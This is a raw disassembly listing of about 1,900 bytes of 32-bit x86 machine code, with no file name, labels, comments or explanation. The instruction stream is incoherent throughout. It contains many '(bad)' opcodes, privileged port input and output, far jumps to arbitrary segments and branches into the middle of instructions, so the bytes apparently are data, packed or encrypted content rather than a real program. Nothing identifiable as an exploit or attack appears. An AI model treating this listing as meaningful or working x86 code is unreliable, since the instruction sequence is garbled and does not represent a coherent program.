  4042aa:	sub    DWORD PTR [edi],0x7824e7e9
  4042b0:	test   al,0x10
  4042b2:	pop    esi
  4042b3:	dec    esi
  4042b4:	push   ebx
  4042b5:	pop    esi
  4042b6:	test   DWORD PTR [esi],edx
  4042b8:	and    al,0xb7
  4042ba:	fnstsw WORD PTR [ecx]
  4042bc:	ds push esi
  4042be:	add    BYTE PTR [eax],bl
  4042c0:	retf   0xe209
  4042c3:	mov    gs,WORD PTR [edx-0x26]
  4042c6:	cmp    eax,DWORD PTR [ebp+0x0]
  4042c9:	adc    ch,ah
  4042cb:	pop    es
  4042cc:	xlat   BYTE PTR ds:[ebx]
  4042cd:	retf   
  4042ce:	sub    esp,DWORD PTR [eax]
  4042d0:	bound  ebx,QWORD PTR [esi-0x57]
  4042d3:	stos   BYTE PTR es:[edi],al
  4042d4:	push   cs
  4042d5:	adc    ebx,DWORD PTR [esi+edx*1-0x78fd4630]
  4042dc:	inc    esi
  4042dd:	icebp  
  4042de:	popf   
  4042df:	outs   dx,BYTE PTR ds:[esi]
  4042e0:	xchg   DWORD PTR [eax],esi
  4042e2:	das    
  4042e3:	jp     0x40426e
  4042e5:	and    DWORD PTR [eax-0xedaa609],edi
  4042eb:	neg    DWORD PTR [edi-0x4e]
  4042ee:	arpl   WORD PTR [ecx-0x2a6ad89d],ax
  4042f4:	push   eax
  4042f5:	adc    BYTE PTR [ecx-0x68],dl
  4042f8:	jmp    0x3dcbfad6
  4042fd:	push   0xffffffc8
  4042ff:	ins    BYTE PTR es:[edi],dx
  404300:	out    dx,al
  404301:	push   ebp
  404302:	jg     0x40437a
  404304:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404305:	adc    bl,BYTE PTR [ebp+0x7b08403]
  40430b:	pop    es
  40430c:	or     eax,0x69989fea
  404311:	push   esi
  404312:	or     ch,BYTE PTR [eax]
  404314:	fldenv [ebp-0x74]
  404317:	ins    BYTE PTR es:[edi],dx
  404318:	xor    al,0x2d
  40431a:	inc    eax
  40431b:	loopne 0x4042e3
  40431d:	jmp    0x845c:0x95eebf34
  404324:	loopne 0x4042db
  404326:	lahf   
  404327:	push   esi
  404328:	inc    esi
  404329:	add    BYTE PTR [eax],dh
  40432b:	ja     0x4042ba
  40432d:	(bad)  
  40432e:	repz push ds
  404330:	pushf  
  404331:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404332:	jnp    0x40430a
  404334:	mov    ebp,0xf7f4879f
  404339:	shl    BYTE PTR [ebx+0x62],0x8b
  40433d:	push   ebp
  40433e:	dec    ebp
  40433f:	mov    bh,0x3d
  404341:	and    bl,ch
  404343:	jle    0x4042e4
  404345:	sbb    ah,BYTE PTR [edx-0x4e]
  404348:	mov    ebp,0xb5041044
  40434d:	shr    BYTE PTR [ebp-0x4564ece0],1
  404353:	sbb    eax,0x199e8b50
  404358:	ja     0x404392
  40435a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40435b:	push   ss
  40435c:	and    BYTE PTR [esp+esi*2],bl
  40435f:	fwait
  404360:	loope  0x4042e4
  404362:	sub    eax,edx
  404364:	mov    al,ds:0x63a75c97
  404369:	gs cdq 
  40436b:	das    
  40436c:	aam    0xbe
  40436e:	add    eax,0x706d8668
  404373:	mov    dl,0x6c
  404375:	add    bh,bh
  404377:	adc    DWORD PTR [ebx+0x1ef9e33f],esp
  40437d:	shr    bl,0xb0
  404380:	push   esp
  404381:	scas   al,BYTE PTR es:[edi]
  404382:	fdiv   DWORD PTR [edx+0x3a]
  404385:	dec    eax
  404386:	rol    BYTE PTR [ebx-0x921a814],0xb1
  40438d:	add    DWORD PTR [eax],ebp
  40438f:	inc    ebp
  404390:	mov    cl,0x74
  404392:	inc    ebx
  404393:	xor    BYTE PTR [edi],ah
  404395:	add    BYTE PTR [edx],dh
  404397:	shr    DWORD PTR [ebp-0x35],0x36
  40439b:	or     ebx,DWORD PTR [edx+0x17]
  40439e:	int3   
  40439f:	cmp    cl,ch
  4043a1:	jecxz  0x4043ba
  4043a3:	mov    ds:0x7f3c5c99,al
  4043a8:	or     ebx,DWORD PTR [ebp+0x21]
  4043ab:	jge    0x40434c
  4043ad:	xor    edi,0x97a8bb95
  4043b3:	jo     0x404391
  4043b5:	mov    dh,0x1d
  4043b7:	ret    
  4043b8:	xor    cl,BYTE PTR [edi+0x1f016fc5]
  4043be:	pop    es
  4043bf:	add    al,0xa7
  4043c2:	shr    ah,0xbb
  4043c5:	sub    al,0x1a
  4043c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043c8:	shl    bl,1
  4043ca:	inc    eax
  4043cb:	mov    ds:0x3ecba73a,al
  4043d0:	sub    DWORD PTR [esi-0x18],0x5adfeb26
  4043d7:	mov    WORD PTR [ecx+eiz*2+0x61be8c11],ss
  4043de:	scas   al,BYTE PTR es:[edi]
  4043df:	and    cl,BYTE PTR [edx]
  4043e1:	pop    edi
  4043e2:	cmp    BYTE PTR [esi],ah
  4043e4:	repnz outs dx,DWORD PTR ss:[esi]
  4043e7:	test   eax,0x3e019dcf
  4043ec:	into   
  4043ed:	retf   
  4043ee:	aam    0x5e
  4043f0:	shl    BYTE PTR [edx+0x1e],cl
  4043f3:	push   ds
  4043f4:	test   eax,0xafe88b95
  4043f9:	mov    es,WORD PTR [esi]
  4043fb:	out    dx,al
  4043fc:	inc    edi
  4043fd:	mov    esp,0xe2237ddd
  404402:	in     eax,0x14
  404404:	frstor [edi+ebp*2]
  404407:	push   ss
  404408:	dec    edi
  404409:	push   0xb4d3f684
  40440e:	lahf   
  40440f:	addr16 int 0xf4
  404412:	sub    esp,esi
  404414:	inc    ecx
  404415:	fldenv [edi*4-0x4c488a54]
  40441c:	enter  0xe0f3,0xe8
  404420:	aaa    
  404421:	das    
  404422:	mov    edx,0x84368fae
  404427:	dec    ebx
  404428:	pop    ss
  404429:	jne    0x40440b
  40442b:	ret    0x7648
  40442e:	fs sti 
  404430:	ror    ebp,cl
  404432:	mov    ah,0x9a
  404434:	fwait
  404435:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404436:	add    eax,0x4b724971
  40443b:	mov    ah,0x25
  40443d:	pop    ss
  40443e:	fst    QWORD PTR [edi+0x32f1401e]
  404444:	repz jp 0x404425
  404447:	aaa    
  404448:	sar    DWORD PTR [ecx],cl
  40444a:	inc    edx
  40444b:	stos   DWORD PTR es:[edi],eax
  40444c:	or     ah,dl
  40444e:	sahf   
  40444f:	dec    esp
  404450:	cdq    
  404451:	pop    ebx
  404452:	dec    esp
  404453:	inc    esp
  404454:	test   BYTE PTR [edx-0x15],0x11
  404458:	in     al,0xa4
  40445a:	mov    ecx,0x9a0d0cde
  40445f:	push   eax
  404460:	xchg   BYTE PTR [eax],bl
  404462:	ror    BYTE PTR [eax+0x1f],0x76
  404466:	sbb    eax,0x556dce3a
  40446b:	aad    0x76
  40446d:	fwait
  40446e:	(bad)  
  40446f:	sub    BYTE PTR [edi],bl
  404471:	rcl    ebp,1
  404473:	xor    ch,BYTE PTR [eax+eax*2+0x3a]
  404477:	jbe    0x4044cd
  404479:	cld    
  40447a:	mov    edi,0x56d59471
  40447f:	in     al,0x7a
  404481:	push   eax
  404482:	gs pop es
  404484:	and    al,bl
  404486:	sbb    eax,0x46631bc9
  40448b:	and    al,0xc7
  40448d:	mov    ebp,0xc503e5d9
  404492:	or     esi,DWORD PTR [edx+0x3943da9e]
  404498:	inc    esi
  404499:	inc    esi
  40449a:	xor    eax,0x75e3ca5b
  40449f:	leave  
  4044a0:	int3   
  4044a1:	and    esp,DWORD PTR [ebp-0x38]
  4044a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044a5:	out    0xec,al
  4044a7:	mov    dl,BYTE PTR ds:0x8864fce8
  4044ad:	ins    DWORD PTR es:[edi],dx
  4044ae:	lea    edi,[esi+0x2f9b726]
  4044b4:	xchg   ebp,eax
  4044b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044b6:	aas    
  4044b7:	xor    al,0x5d
  4044b9:	adc    al,0x0
  4044bb:	or     DWORD PTR [edi],esi
  4044bd:	sub    dh,bh
  4044bf:	adc    esp,DWORD PTR [ebp-0x16]
  4044c2:	and    BYTE PTR [edi],ah
  4044c4:	jb     0x404541
  4044c6:	test   DWORD PTR ds:[ebp+0x2f],0xf4ebe625
  4044ce:	add    ecx,DWORD PTR [ecx+0x37]
  4044d1:	xchg   edi,eax
  4044d2:	repnz lods al,BYTE PTR ds:[esi]
  4044d4:	sbb    ebp,DWORD PTR [ebp+0x4f]
  4044d7:	int3   
  4044d8:	add    al,0xfc
  4044da:	mov    al,0x71
  4044dc:	adc    ah,bl
  4044de:	into   
  4044df:	mov    esp,0x3c27e20c
  4044e4:	inc    edi
  4044e5:	stos   BYTE PTR es:[edi],al
  4044e6:	and    cl,BYTE PTR [esi-0xc]
  4044e9:	(bad)  
  4044ea:	vpor   ymm4,ymm7,ymm1
  4044ee:	lods   eax,DWORD PTR ds:[esi]
  4044ef:	rcl    DWORD PTR [ecx],cl
  4044f1:	lods   eax,DWORD PTR ds:[esi]
  4044f2:	add    DWORD PTR [ecx],esp
  4044f4:	scas   al,BYTE PTR es:[edi]
  4044f5:	cmp    esi,esp
  4044f7:	add    al,0x8c
  4044f9:	xchg   BYTE PTR [ecx+eiz*1-0x50],bl
  4044fd:	mov    al,BYTE PTR [edx+0x1e]
  404500:	shl    DWORD PTR [esi],1
  404502:	fbld   TBYTE PTR [edx-0x1e]
  404505:	dec    ebx
  404506:	push   ds
  404507:	outs   dx,BYTE PTR ds:[esi]
  404508:	mov    bl,0x13
  40450a:	adc    eax,0xb3193a1f
  40450f:	std    
  404510:	gs scas eax,DWORD PTR es:[edi]
  404512:	jo     0x404496
  404514:	and    DWORD PTR [esi-0x67],esi
  404517:	ror    BYTE PTR [edi],0x1c
  40451a:	imul   ebx,DWORD PTR [ebx],0x15fb05a1
  404520:	push   0xffffffbf
  404522:	push   ebp
  404523:	ret    0xceda
  404526:	sub    al,0x41
  404528:	cmp    esp,edi
  40452a:	retf   
  40452b:	fwait
  40452c:	push   0xb
  40452e:	xchg   ebp,eax
  40452f:	xor    BYTE PTR [edi+0x66b78cb9],bh
  404535:	xlat   BYTE PTR ds:[ebx]
  404536:	das    
  404537:	xor    al,0x16
  404539:	dec    eax
  40453a:	imul   esp,DWORD PTR [esi],0x10
  40453d:	fstp   DWORD PTR fs:[edx-0x2d26b7fd]
  404544:	mov    al,ds:0x9fe932cf
  404549:	xlat   BYTE PTR ds:[ebx]
  40454a:	shl    BYTE PTR [ecx-0x29b4393b],0x1e
  404551:	xchg   DWORD PTR [eax+0xa9a9269],ebp
  404557:	pop    ss
  404558:	mov    esi,0xc50ac463
  40455d:	pushf  
  40455e:	mov    ecx,0x180994ab
  404563:	cld    
  404564:	sbb    edi,esp
  404566:	cmp    ah,BYTE PTR [edx-0x20d9743a]
  40456c:	sub    ebp,eax
  40456e:	stc    
  40456f:	out    dx,eax
  404570:	scas   eax,DWORD PTR es:[edi]
  404571:	cmp    edi,DWORD PTR [ebx]
  404573:	push   ebx
  404574:	daa    
  404575:	addr16 inc esp
  404577:	repz ror BYTE PTR [ebp-0x34989c87],1
  40457e:	jns    0x4045fa
  404580:	mov    cl,0xf8
  404582:	das    
  404583:	fisub  DWORD PTR [ebx]
  404585:	sub    DWORD PTR [ecx],edi
  404587:	pop    ecx
  404588:	adc    ecx,DWORD PTR [edi]
  40458a:	retf   
  40458b:	rcl    DWORD PTR [esi],0xe5
  40458e:	mov    al,0x11
  404590:	push   edx
  404591:	push   cs
  404592:	mov    edi,0xeb0cafac
  404597:	scas   al,BYTE PTR es:[edi]
  404598:	mov    ah,0x8d
  40459a:	dec    ebx
  40459b:	stc    
  40459c:	mov    DWORD PTR [ecx-0x68f7a93f],esp
  4045a2:	repz out 0xe6,al
  4045a5:	rcl    BYTE PTR [edi+ebp*4-0x1e],0x59
  4045aa:	dec    esp
  4045ab:	inc    esp
  4045ac:	pop    ecx
  4045ad:	fcmovnb st,st(4)
  4045af:	pop    esi
  4045b0:	das    
  4045b1:	ror    BYTE PTR [edx-0x31],cl
  4045b4:	std    
  4045b5:	mov    cl,0xb0
  4045b7:	call   FWORD PTR fs:0x2917e227
  4045be:	test   DWORD PTR [esi+0x42d0f4f4],edi
  4045c4:	(bad)  
  4045c5:	mov    ?,ecx
  4045c7:	mov    cl,BYTE PTR [ebx]
  4045c9:	outs   dx,BYTE PTR ds:[esi]
  4045ca:	cmp    eax,ecx
  4045cc:	sbb    ah,ah
  4045ce:	and    al,0x98
  4045d0:	or     esp,DWORD PTR [esi+0x737ab3f2]
  4045d6:	in     eax,0x4d
  4045d8:	mov    ds:0x9e49b7a0,al
  4045dd:	mov    edx,0xaa8daae4
  4045e2:	out    0x89,al
  4045e4:	das    
  4045e5:	push   eax
  4045e6:	fisttp QWORD PTR [ebx]
  4045e8:	(bad)  
  4045e9:	pop    ss
  4045ea:	(bad)  
  4045eb:	pop    edx
  4045ec:	pusha  
  4045ed:	mov    dh,0x7f
  4045ef:	mov    bl,0x7e
  4045f1:	nop
  4045f2:	repnz mov WORD PTR [ecx+0x2cfa7f70],ss
  4045f9:	cmp    eax,0xe8f73477
  4045fe:	shl    BYTE PTR [edi+0x65],cl
  404601:	mov    ebp,DWORD PTR cs:[ecx-0x5aea93c9]
  404608:	ret    
  404609:	jnp    0x404614
  40460b:	cmp    ebp,DWORD PTR [edx+0xa]
  40460e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40460f:	and    al,bl
  404611:	adc    DWORD PTR [edi],esi
  404613:	enter  0x624d,0x8d
  404617:	leave  
  404618:	out    0x10,al
  40461a:	fisub  DWORD PTR [edi-0x1420771e]
  404620:	push   ecx
  404621:	nop
  404622:	jns    0x404649
  404624:	or     bh,BYTE PTR [eax]
  404626:	mov    edx,0x60661886
  40462b:	fimul  DWORD PTR [ebx+eiz*2+0x108abb1e]
  404632:	xchg   ebx,eax
  404633:	mov    edx,DWORD PTR ds:0xeaa43e4b
  404639:	jecxz  0x4046ac
  40463b:	and    DWORD PTR [esi-0x25699868],ecx
  404641:	dec    eax
  404642:	pop    ebp
  404643:	xor    eax,0x8b787d3
  404648:	pop    esi
  404649:	sbb    DWORD PTR [esi+0xf],ebx
  40464c:	mov    ah,0xeb
  40464e:	int    0xf
  404650:	inc    ebx
  404651:	adc    esi,ebp
  404653:	or     ebp,DWORD PTR [edi-0x39517d2e]
  404659:	fimul  WORD PTR [eax+0x16]
  40465c:	dec    esp
  40465d:	mov    eax,0xb7feb597
  404662:	mov    DWORD PTR [edi+0x53c314bf],edi
  404668:	jo     0x4046e5
  40466a:	loope  0x40463c
  40466c:	add    DWORD PTR [ecx+ebp*4+0x54],0x72472e45
  404674:	pop    eax
  404675:	shr    BYTE PTR [ecx-0x1a],1
  404678:	push   ds
  404679:	(bad)  
  40467a:	pop    ebp
  40467b:	sub    ch,BYTE PTR [ebx+0x6a]
  40467e:	add    eax,0xdcf6741d
  404683:	or     ebp,esp
  404685:	dec    esp
  404686:	lods   al,BYTE PTR ds:[esi]
  404687:	test   dh,bl
  404689:	cmp    al,0x44
  40468b:	jmp    0x5e16:0xae891914
  404692:	or     al,0x5
  404694:	out    dx,eax
  404695:	stos   BYTE PTR es:[edi],al
  404696:	xchg   ecx,eax
  404697:	test   al,0x94
  404699:	repz lds si,DWORD PTR [eax]
  40469d:	mov    ah,cl
  40469f:	pop    ds
  4046a0:	arpl   WORD PTR [ebx+0x1b36da1d],bx
  4046a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046a7:	retf   
  4046a8:	dec    ecx
  4046a9:	es retf 0x6540
  4046ad:	pop    es
  4046ae:	xchg   esp,eax
  4046af:	ja     0x404649
  4046b1:	sub    ebx,DWORD PTR [edx+edx*4-0x7999b9b4]
  4046b8:	(bad)  
  4046b9:	and    al,0x1c
  4046bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046bc:	aaa    
  4046bd:	sar    DWORD PTR [ebx+0x25],cl
  4046c0:	pushf  
  4046c1:	stos   BYTE PTR es:[edi],al
  4046c2:	(bad)  
  4046c3:	xchg   esi,eax
  4046c4:	mov    ah,ch
  4046c6:	and    eax,0x43d4d87f
  4046cb:	(bad)  
  4046cc:	icebp  
  4046cd:	ret    
  4046ce:	aad    0x87
  4046d0:	ret    0x8169
  4046d3:	add    edi,DWORD PTR [ecx+0xe]
  4046d6:	xor    eax,0x8ba5e682
  4046db:	js     0x4046ae
  4046dd:	fsubr  st,st(4)
  4046df:	mov    al,0xa6
  4046e1:	and    BYTE PTR [edx+0x70],dl
  4046e4:	imul   ebx,DWORD PTR [ecx+0x6eeefaea],0xffffff81
  4046eb:	pop    edx
  4046ec:	dec    ebx
  4046ed:	pushf  
  4046ee:	iret   
  4046ef:	in     al,dx
  4046f0:	mov    ds:0x3eb9e14a,al
  4046f5:	jmp    0x7d2c5bb9
  4046fa:	inc    edx
  4046fb:	jbe    0x4046d7
  4046fd:	les    edi,FWORD PTR [eax]
  4046ff:	pop    ebp
  404700:	mov    edx,0x16ba3908
  404705:	int    0x1d
  404707:	sub    al,0x4d
  404709:	aam    0x3e
  40470b:	push   eax
  40470c:	es mov ebx,0x43b4b318
  404712:	pop    ebp
  404713:	retf   
  404714:	lds    edx,FWORD PTR [edi-0x5767b1a2]
  40471a:	jp     0x4046ef
  40471c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40471d:	fisttp DWORD PTR [ebx-0x72]
  404720:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404721:	mov    cl,0x7d
  404723:	mov    bh,0xf2
  404725:	sbb    eax,0xe7482b
  40472a:	lods   eax,DWORD PTR ds:[esi]
  40472b:	push   ebp
  40472c:	jmp    0x8cf2:0xbfd704a1
  404733:	imul   ecx,esi,0x68c73e34
  404739:	xor    cl,BYTE PTR [ebp+eiz*8-0x51ba5455]
  404740:	outs   dx,DWORD PTR ds:[esi]
  404741:	mov    esp,0xdeb3e384
  404746:	xchg   edi,eax
  404747:	shl    DWORD PTR es:[ebx+0x76],0x7e
  40474c:	(bad)  
  40474d:	into   
  40474e:	push   ebp
  40474f:	outs   dx,BYTE PTR ds:[esi]
  404750:	scas   al,BYTE PTR es:[edi]
  404751:	dec    edi
  404752:	ds dec edx
  404754:	aam    0x7d
  404756:	dec    edi
  404757:	les    ebp,FWORD PTR [esi-0x747aeee3]
  40475d:	jno    0x4047a0
  40475f:	jp     0x4047c7
  404761:	fisttp WORD PTR [edx-0x7b8ecfdf]
  404767:	add    ah,BYTE PTR [edi-0x4cb71e19]
  40476d:	add    BYTE PTR [ecx-0x4dfd3201],dl
  404773:	jg     0x4047a9
  404775:	(bad)  
  404776:	xor    BYTE PTR [ecx-0x64b9628b],bl
  40477c:	je     0x404739
  40477e:	ret    
  40477f:	inc    esi
  404780:	iret   
  404781:	lods   eax,DWORD PTR ds:[esi]
  404782:	mov    WORD PTR [ecx-0x44],fs
  404785:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404786:	dec    ecx
  404787:	or     eax,0xe5d446f5
  40478c:	add    dh,BYTE PTR [esi]
  40478e:	sub    al,0x8
  404790:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404791:	cmc    
  404792:	dec    ebp
  404793:	(bad)  [ebp-0x509b104f]
  404799:	test   eax,0x62184351
  40479e:	int3   
  40479f:	int    0x6f
  4047a1:	vpunpcklbw xmm0,xmm5,XMMWORD PTR ds:0x4cfc3dec
  4047a9:	push   0x58e1da5b
  4047ae:	jb     0x404756
  4047b0:	(bad)  
  4047b1:	cmc    
  4047b2:	xchg   esp,eax
  4047b3:	aas    
  4047b4:	aad    0xcd
  4047b6:	out    0x36,eax
  4047b8:	cli    
  4047b9:	(bad)  
  4047ba:	xchg   edx,eax
  4047bb:	into   
  4047bc:	inc    ecx
  4047bd:	cmp    edx,DWORD PTR [esi-0x7c]
  4047c0:	pop    esi
  4047c1:	inc    esi
  4047c2:	test   eax,0x59e3d72a
  4047c7:	adc    DWORD PTR [esi],ecx
  4047c9:	xchg   BYTE PTR [eax+0x2a],ah
  4047cc:	pop    ds
  4047cd:	fadd   QWORD PTR [edi+0x687f3b7e]
  4047d3:	imul   esi,ebx,0x30961852
  4047d9:	push   0x63
  4047db:	xchg   ebx,eax
  4047dc:	xchg   esp,eax
  4047dd:	jb     0x404776
  4047df:	(bad)  
  4047e1:	mov    cl,0xaa
  4047e3:	mov    esp,0xd655eabc
  4047e8:	sbb    ah,ah
  4047ea:	repz gs dec ebp
  4047ed:	mov    ?,WORD PTR [esi+0x6f58d2d6]
  4047f3:	mov    edx,0x2bb87180
  4047f8:	mov    ebp,0xa66368e5
  4047fd:	out    0x12,eax
  4047ff:	aad    0x9b
  404801:	repnz cli 
  404803:	xor    esp,DWORD PTR [edx-0x36f93b4d]
  404809:	add    BYTE PTR [ecx-0xea74122],ah
  40480f:	inc    esp
  404810:	cmp    DWORD PTR [esi-0x1e],edi
  404813:	(bad)  
  404814:	sbb    eax,0xeb4fb740
  404819:	lods   eax,DWORD PTR ds:[esi]
  40481a:	(bad)  
  40481b:	jle    0x4047d0
  40481d:	iret   
  40481e:	test   DWORD PTR [esi],ecx
  404820:	xor    al,0x53
  404822:	in     al,0x49
  404824:	ins    BYTE PTR es:[edi],dx
  404825:	loopne 0x404865
  404827:	adc    BYTE PTR [ecx],0xa2
  40482a:	gs mov ebx,0x855abbf6
  404830:	push   eax
  404831:	sbb    DWORD PTR [ebp+ebp*4+0x46],ebp
  404835:	lods   al,BYTE PTR ds:[esi]
  404836:	mov    BYTE PTR [esi+0x3a],0x96
  40483a:	pushf  
  40483b:	hlt    
  40483c:	out    dx,al
  40483d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40483e:	cs push 0xffffff88
  404841:	jno    0x40488a
  404843:	dec    ecx
  404844:	adc    DWORD PTR [edx-0x66db14d2],ebx
  40484a:	push   esp
  40484b:	dec    eax
  40484c:	pop    eax
  40484d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40484e:	xor    ebp,edx
  404850:	call   0x6558:0xcea89815
  404857:	clc    
  404858:	(bad)  
  404859:	test   al,0xb9
  40485b:	pusha  
  40485c:	retf   0xc868
  40485f:	arpl   WORD PTR [edx],ax
  404861:	adc    BYTE PTR [ecx+0x28],0x26
  404865:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404866:	pop    ecx
  404867:	fistp  QWORD PTR [edx+0x11]
  40486a:	rol    DWORD PTR [ebx+0x64d14225],0xab
  404871:	jmp    0xd281ac48
  404876:	or     DWORD PTR [ebp+eax*1+0x75],edx
  40487a:	cdq    
  40487b:	xrelease mov DWORD PTR [ebx+0x23ef5ec],ebx
  404882:	pop    edi
  404883:	pop    esp
  404884:	mov    ebp,0xbc66c066
  404889:	mov    edx,0x5034d2d5
  40488e:	mov    bh,0x62
  404890:	(bad)  
  404891:	push   edi
  404892:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404893:	mov    ds:0x842939ee,al
  404898:	gs push ebx
  40489a:	pop    edx
  40489b:	mov    dh,0x3c
  40489d:	stos   BYTE PTR es:[edi],al
  40489e:	stc    
  40489f:	fld    st(3)
  4048a1:	repnz adc dl,ah
  4048a4:	push   0x552f8479
  4048a9:	sub    esi,DWORD PTR fs:[esi+edx*8+0x22]
  4048ae:	mov    WORD PTR [esi],ss
  4048b0:	sub    DWORD PTR [ebx-0x2e],ecx
  4048b3:	iret   
  4048b4:	and    ah,BYTE PTR [edx-0x14bd7cb3]
  4048ba:	fisubr DWORD PTR [edx+ebp*2]
  4048bd:	retf   
  4048be:	mov    dh,0xef
  4048c0:	cli    
  4048c1:	ret    
  4048c2:	jecxz  0x404899
  4048c4:	in     eax,dx
  4048c5:	rol    DWORD PTR [esi-0x69076a4f],1
  4048cb:	push   ecx
  4048cc:	push   edi
  4048cd:	daa    
  4048ce:	mov    al,ds:0x3c6395bc
  4048d3:	xchg   ecx,eax
  4048d4:	pop    esp
  4048d5:	push   ds
  4048d6:	cmp    ah,cl
  4048d8:	push   es
  4048d9:	(bad)  
  4048da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048db:	fisub  DWORD PTR gs:[eax-0x29]
  4048df:	ins    BYTE PTR es:[edi],dx
  4048e0:	stos   DWORD PTR es:[edi],eax
  4048e1:	mov    cl,0xef
  4048e3:	shl    BYTE PTR [ecx+ecx*8],0x5c
  4048e7:	bound  edi,QWORD PTR [edx-0x4e]
  4048ea:	addr16 inc ecx
  4048ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048ed:	cmp    al,0xa2
  4048ef:	sub    esp,DWORD PTR [esi]
  4048f1:	jno    0x4048b2
  4048f3:	inc    edx
  4048f4:	mov    ebx,0x497952a2
  4048f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048fa:	cmp    DWORD PTR [eax-0x5d1dcd24],ecx
  404900:	jo     0x404915
  404902:	stc    
  404903:	imul   ebx,DWORD PTR [esi],0xffffff88
  404906:	sbb    BYTE PTR ds:0xe2c4cfd8,al
  40490c:	mov    DWORD PTR [ebx],ebx
  40490e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40490f:	inc    esi
  404910:	lahf   
  404911:	scas   al,BYTE PTR es:[edi]
  404912:	mov    dl,0x19
  404914:	popf   
  404915:	cld    
  404916:	jg     0x4048a6
  404918:	sub    ecx,ebp
  40491a:	push   edx
  40491b:	jecxz  0x40497b
  40491d:	jno    0x404968
  40491f:	xchg   edx,eax
  404920:	inc    ebp
  404921:	pop    DWORD PTR [ebx+0x68d76848]
  404927:	retf   
  404928:	std    
  404929:	dec    ebx
  40492a:	jb     0x4048ef
  40492c:	ja     0x4048f7
  40492e:	cwde   
  40492f:	jle    0x404979
  404931:	add    BYTE PTR [edx-0x5e1c80f1],ah
  404937:	and    bh,BYTE PTR [ebp-0x2f]
  40493a:	sbb    bl,ch
  40493c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40493d:	(bad)  
  40493f:	or     eax,0xb5352de5
  404944:	data16 rol ah,1
  404947:	mov    dh,0xd6
  404949:	xchg   esi,eax
  40494a:	pop    es
  40494b:	adc    esi,DWORD PTR [edx-0x326b3d2]
  404951:	xlat   BYTE PTR ds:[ebx]
  404952:	(bad)  
  404954:	mov    ecx,0x2e7b32bc
  404959:	fbld   TBYTE PTR [edx-0x1c0aedad]
  40495f:	push   0x957ad517
  404964:	sbb    DWORD PTR [ebx-0x514099bc],eax
  40496a:	or     BYTE PTR [ecx+0x7381ef47],dl
  404970:	cmp    al,0x2e
  404972:	in     al,dx
  404973:	push   ecx
  404974:	dec    edx
  404975:	cmp    BYTE PTR [esi],0x68
  404978:	retf   
  404979:	js     0x404994
  40497b:	dec    ecx
  40497c:	test   BYTE PTR [esp+ebx*4+0x5544c9c0],dh
  404983:	das    
  404984:	mov    ch,0x21
  404986:	gs retf 0x4640
  40498a:	pop    edx
  40498b:	cld    
  40498c:	mov    al,ds:0x46ce987e
  404991:	aam    0x67
  404993:	lahf   
  404994:	scas   al,BYTE PTR es:[edi]
  404995:	xor    esp,DWORD PTR [ebx-0x70]
  404998:	jmp    0xfa4:0x2e8dfb30
  40499f:	ret    0x9033
  4049a2:	inc    edx
  4049a3:	xlat   BYTE PTR ds:[ebx]
  4049a4:	and    dl,BYTE PTR [esi+0x1]
  4049a7:	pop    ds
  4049a8:	test   BYTE PTR ds:0x56313f2c,dh
  4049ae:	push   edx
  4049af:	and    edx,DWORD PTR [ecx+0x5071acc9]
  4049b5:	sub    ebp,DWORD PTR [edx]
  4049b7:	xchg   esp,eax
  4049b8:	push   eax
  4049b9:	hlt    
  4049ba:	lods   eax,DWORD PTR ds:[esi]
  4049bb:	xchg   esi,eax
  4049bc:	rol    dl,cl
  4049be:	sbb    BYTE PTR [ebp+0x657afa86],dh
  4049c4:	dec    ebp
  4049c5:	cli    
  4049c6:	imul   ecx,esi,0x4017be95
  4049cc:	inc    ebx
  4049cd:	cdq    
  4049ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049cf:	retf   0xedc
  4049d2:	dec    ebp
  4049d3:	push   ebx
  4049d4:	cmp    cl,BYTE PTR [eax+0x7d]
  4049d7:	inc    ecx
  4049d8:	fwait
  4049d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049da:	ficomp WORD PTR [ecx-0x23]
  4049dd:	cmp    ah,BYTE PTR [esi-0x544db853]
  4049e3:	in     eax,dx
  4049e4:	cmc    
  4049e5:	mov    cl,0xca
  4049e7:	adc    DWORD PTR [eax-0x7f],0xffffff86
  4049eb:	sahf   
  4049ec:	int3   
  4049ed:	(bad)  
  4049ee:	cmp    eax,0x368dbfac
  4049f3:	pusha  
  4049f4:	jle    0x4049fe
  4049f6:	retf   
  4049f7:	cmc    
  4049f8:	cdq    
  4049f9:	out    dx,eax
  4049fa:	cli    
  4049fb:	loop   0x40499c
  4049fd:	(bad)  
  4049fe:	and    ebp,DWORD PTR [edx-0x5f]
  404a01:	ins    DWORD PTR es:[edi],dx
  404a02:	out    0x6,al
  404a04:	pop    ecx
  404a05:	adc    ah,cl
  404a07:	into   
  404a08:	sub    al,0x43
  404a0a:	fmul   DWORD PTR [edx-0x63]
  404a0d:	lahf   
  404a0e:	and    eax,0xb5710aed
  404a13:	(bad)  [esi-0x52c9dac3]
  404a19:	cmp    edx,DWORD PTR [esp+esi*2-0x6c]
  404a1d:	mov    cs,WORD PTR [esi-0x63]
  404a20:	dec    esi
